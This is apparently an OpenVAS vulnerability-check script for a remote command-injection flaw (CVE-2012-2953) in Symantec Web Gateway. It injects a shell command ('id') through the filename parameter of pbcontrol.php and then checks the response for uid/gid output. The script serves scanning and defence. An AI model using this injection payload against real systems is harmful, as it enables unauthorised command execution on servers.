CPE = "cpe:/a:symantec:web_gateway";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103527" );
	script_bugtraq_id( 54426 );
	script_cve_id( "CVE-2012-2953" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_name( "Symantec Web Gateway Remote Shell Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54426" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2012-07-26 10:16:05 +0200 (Thu, 26 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_symantec_web_gateway_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "symantec_web_gateway/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the reference for more details." );
	script_tag( name: "summary", value: "Symantec Web Gateway is prone to a vulnerability that can allow an
attacker to execute arbitrary commands." );
	script_tag( name: "impact", value: "Successful exploits will result in the execution of arbitrary attack-
supplied commands in the context of the affected application." );
	script_tag( name: "affected", value: "Symantec Web Gateway versions 5.0.x.x are vulnerable." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
cmd = "id";
url = dir + "/spywall/pbcontrol.php?filename=VT-Test%22%3b" + cmd + "%3b%22&stage=0";
if(http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

